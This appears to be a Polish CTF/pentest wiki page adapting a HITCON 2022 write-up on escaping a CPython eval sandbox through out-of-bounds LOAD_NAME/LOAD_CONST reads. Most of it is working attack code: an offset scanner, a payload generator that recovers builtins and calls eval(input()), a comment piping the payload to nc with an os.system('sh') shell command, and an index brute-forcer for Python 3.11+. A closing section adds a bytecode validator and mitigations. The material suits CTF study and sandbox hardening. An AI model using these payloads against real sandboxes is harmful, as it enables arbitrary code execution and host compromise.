# LOAD_NAME / LOAD_CONST opcode OOB Read

Ta strona adaptuje oryginalny writeup Splitline oraz exploit chain z HITCON CTF 2022 „V O I D”.<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Operand `LOAD_NAME` lub `LOAD_CONST` może odczytywać dane spoza celowo skróconej krotki `co_names` lub `co_consts`. W tym challenge’u używane są nieosiągalne dummy names, dopóki pobliski wpis nie zawiera przydatnego atrybutu, takiego jak `__getattribute__`.<sup>[[1]](#references)</sup>

Pozostała część payloadu ponownie wykorzystuje odzyskaną nazwę do zbudowania sandbox escape.<sup>[[1]](#references)</sup>

### Przegląd <a href="#overview-1" id="overview-1"></a>

Wrapper challenge’u jest krótki i kompiluje jedno wyrażenie przed jego ewaluacją:<sup>[[1]](#references)</sup>
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))
```
Dane wejściowe są kompilowane do obiektu kodu Python, a następnie wrapper zastępuje jego `co_consts` i `co_names` pustymi krotkami przed wywołaniem `eval`.<sup>[[1]](#references)[[5]](#references)</sup>

Każda wygenerowana instrukcja, która nadal indeksuje jedną z tych tabel, może spowodować crash interpretera lub ujawnić wskaźnik do sąsiedniego obiektu, zależnie od builda.<sup>[[1]](#references)</sup>

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Jak dochodzi do segfault?

Dla wyrażenia listowego takiego jak `[a, b, c]` compiler generuje instrukcje `LOAD_NAME` z kolejnymi operandami:<sup>[[1]](#references)[[2]](#references)</sup>
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE
```
Jeśli `co_names` zostanie zastąpione przez `()`, bytecode nadal zawiera `LOAD_NAME 2`; niekontrolowany dostęp do krotki może więc pobrać wskaźnik spoza krotki zamiast zgłosić `IndexError`.<sup>[[1]](#references)[[3]](#references)</sup>

`LOAD_NAME` i `LOAD_CONST` to podstawowe primitives w tym przypadku: ich operandami całkowitymi wybiera się odpowiednio wpisy w `co_names` i `co_consts`.<sup>[[1]](#references)[[2]](#references)</sup>

W mechanizmie dispatch CPythona `LOAD_CONST` pobiera wybrany wpis krotki i umieszcza go na stosie; wersje release używają niekontrolowanego accessora krotki:<sup>[[3]](#references)</sup>
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}
```
Przetestuj rosnące operandy `LOAD_NAME` w interpreterze docelowym, aby zmapować przydatne wpisy. Splitline zaobserwował przydatne offsety powyżej 700 w środowisku challenge, ale układ zależy od buildu; debugger może pomóc w sprawdzeniu otaczającej pamięci.<sup>[[1]](#references)</sup>

### Generowanie Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Gdy offset zwróci przydatną nazwę, umieść wyszukiwanie poza zakresem w nieosiągalnym wyrażeniu i odwołaj się do tego samego slotu `co_names` z osiągalnego dostępu do atrybutu.<sup>[[1]](#references)</sup>

Na przykład, jeśli offset 5 zwraca `__getattribute__`, zachowaj tę nazwę w slocie 5, podczas gdy gałąź false wykonuje przydatne wyszukiwanie:<sup>[[1]](#references)</sup>
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]
```
> Odzyskany tekst nie musi być `__getattribute__`; dowolny identyfikator, który obsługuje payload, może zająć to miejsce.<sup>[[1]](#references)</sup>

Kompilator ponownie wykorzystuje miejsce `co_names` dla powtarzających się wystąpień jednej nazwy, jak pokazuje disassembly:<sup>[[1]](#references)[[2]](#references)</sup>
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE
```
Ponieważ `LOAD_ATTR` również rozwiązuje swoją nazwę za pośrednictwem `co_names`, osiągalna gałąź może ponownie użyć tego slotu; spakowane operandy w nowszych wersjach CPython opisano w poniższych uwagach dotyczących wersji.<sup>[[1]](#references)[[2]](#references)</sup>

Małe nieujemne liczby całkowite można tworzyć z wyrażeń logicznych bez używania stałych:<sup>[[1]](#references)</sup>

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Skrypt Exploit <a href="#exploit-script-1" id="exploit-script-1"></a>

Oryginalny exploit używał nazw zamiast stałych, aby zmieścić się w limicie długości zadania.<sup>[[1]](#references)</sup>

Ten helper skanuje kandydackie offsety nazw, konstruując obiekt kodu z pustą krotką `co_names`.<sup>[[1]](#references)</sup>
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done
```
Poniższy generator mapuje odzyskane offsety na nazwy i emituje payload na poziomie źródłowym.<sup>[[1]](#references)</sup>
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Na wysokim poziomie wygenerowany payload uzyskuje zmienne globalne funkcji, odzyskuje `builtins` i wywołuje `eval(input())`.<sup>[[1]](#references)</sup>
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Uwagi dotyczące wersji i instrukcje, których dotyczy problem (Python 3.11–3.13)

- W CPython 3.11–3.13 instrukcje nadal używają operandów całkowitych do indeksowania tabel stałych i nazw obiektu code. Jeśli którykolwiek z krotek jest krótsza niż wskazany indeks, niekontrolowany dostęp może odczytać wskaźnik sąsiedniego obiektu i spowodować awarię albo operować na tym obiekcie; dokładne zachowanie zależy od kompilacji interpretera.<sup>[[2]](#references)[[3]](#references)</sup>
- `LOAD_CONST consti` oraz (3.12+) `RETURN_CONST consti` odczytują `co_consts[consti]`.<sup>[[2]](#references)</sup>
- Instrukcje bezpośrednio korzystające z tabeli nazw obejmują `LOAD_NAME`, `STORE_NAME`, `DELETE_NAME`, `STORE_GLOBAL`, `DELETE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `STORE_ATTR`, `DELETE_ATTR` oraz (3.12+) `LOAD_FROM_DICT_OR_GLOBALS`.<sup>[[2]](#references)</sup>
- `LOAD_GLOBAL namei` i `LOAD_ATTR namei` używają `co_names[namei >> 1]`; najniższy bit kontroluje udokumentowane zachowanie NULL/metody. (3.12+) `LOAD_SUPER_ATTR namei` używa `co_names[namei >> 2]` i przechowuje dwie flagi w swoich najniższych bitach.<sup>[[2]](#references)</sup>
- Python 3.11+ wprowadził adaptacyjne/inline caches, które dodają ukryte wpisy `CACHE` między instrukcjami. Ręcznie tworzone bytecode musi uwzględniać te wpisy podczas budowania `co_code`.<sup>[[2]](#references)</sup>

Praktyczna konsekwencja: układ bytecode i odzyskane offsety zależą od wersji i kompilacji. Przed poleganiem na tej technice przetestuj ją oraz każdy wygenerowany payload względem docelowej wersji CPython.<sup>[[2]](#references)</sup>

### Szybki skaner przydatnych indeksów OOB (zgodny z 3.11+/3.12+)

Jeśli wolisz bezpośrednio wyszukiwać interesujące obiekty z poziomu bytecode zamiast korzystać z kodu wysokiego poziomu, możesz generować minimalne obiekty code i przeprowadzać brute-force indeksów. Poniższy helper wstawia inline caches zgodnie z metadanymi `dis` docelowego interpretera.<sup>[[2]](#references)</sup>
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notatki
- Aby zamiast tego sprawdzać nazwy, zamień `LOAD_CONST` na `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` i dostosuj użycie stosu oraz spakowany operand dla docelowego opcode.<sup>[[2]](#references)</sup>
- W razie potrzeby użyj `EXTENDED_ARG` lub wielu bajtów `arg`, aby uzyskać dostęp do indeksów >255. Ten helper emituje tylko dolny bajt operandu, więc większe indeksy wymagają bezpośredniego konstruowania bajtów lub wielu loadów.<sup>[[2]](#references)</sup>

### Minimalny wzorzec RCE wyłącznie na bytecode (co_consts OOB → builtins → eval/input)

Po zidentyfikowaniu indeksu `co_consts`, który wskazuje na moduł builtins, można odtworzyć `eval(input())` bez `co_names`, manipulując stosem. Materiały oficjalnego B01lers CTF 2024 `awpcode` dokumentują ten sam wzorzec OOB-read.<sup>[[4]](#references)</sup>
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
To podejście oparte wyłącznie na stosie jest przydatne, gdy challenge daje bezpośrednią kontrolę nad `co_code`, jednocześnie wymuszając `co_consts=()` i `co_names=()`; pozwala uniknąć sztuczek na poziomie źródłowym i może zmniejszyć payload dzięki operacjom stosu bytecode oraz builderom krotek.<sup>[[4]](#references)</sup>

### Kontrole obronne i sposoby mitygacji dla sandboxów

Jeśli tworzysz Python sandbox, który kompiluje lub wykonuje niezaufany kod, nie polegaj na CPython przy sprawdzaniu zakresu indeksów krotek używanych przez bytecode. Weryfikuj obiekty kodu przed ich wykonaniem.<sup>[[2]](#references)[[3]](#references)</sup>

Praktyczny walidator (odrzuca dostęp OOB do co_consts/co_names).<sup>[[2]](#references)</sup>
```python
import dis

def max_name_index(code):
max_idx = -1
direct_name_ops = {
"LOAD_NAME", "STORE_NAME", "DELETE_NAME", "STORE_GLOBAL", "DELETE_GLOBAL",
"IMPORT_NAME", "IMPORT_FROM", "STORE_ATTR", "DELETE_ATTR",
"LOAD_FROM_DICT_OR_GLOBALS",
}
for ins in dis.get_instructions(code):
if ins.opname in direct_name_ops | {"LOAD_ATTR", "LOAD_GLOBAL", "LOAD_SUPER_ATTR"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL pack one flag; LOAD_SUPER_ATTR packs two.
if ins.opname in {"LOAD_ATTR", "LOAD_GLOBAL"}:
namei >>= 1
elif ins.opname == "LOAD_SUPER_ATTR":
namei >>= 2
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname in {"LOAD_CONST", "RETURN_CONST"}] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Dodatkowe pomysły na mitigation
- Nie zezwalaj na arbitralne użycie `CodeType.replace(...)` na niezaufanych danych wejściowych lub dodaj ścisłe kontrole strukturalne wynikowego obiektu kodu.
- Rozważ uruchamianie niezaufanego kodu w osobnym procesie z sandboxingiem na poziomie systemu operacyjnego (seccomp, job objects, kontenery), zamiast polegać na semantyce CPython.

## References

- [1] [Writeup Splitline z HITCON CTF 2022 „V O I D” (źródło tej techniki i exploit chain wysokiego poziomu)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Dokumentacja `dis` dla Python 3.13 (indeksy bytecode, spakowane operandy nazw i inline caches)](https://docs.python.org/3.13/library/dis.html)
- [3] [Makra dostępu do tuple (`GETITEM`) w CPython 3.13.5](https://github.com/python/cpython/blob/v3.13.5/Python/ceval_macros.h#L133-L143)
- [4] [Writeup challenge'u `awpcode` z B01lers CTF 2024 (CygnusX)](https://github.com/b01lers/b01lers-ctf-2024-public/tree/main/misc/awpcode)
- [5] [Python C API: obiekty kodu](https://docs.python.org/3/c-api/code.html)
{{#include ../../../banners/hacktricks-training.md}}
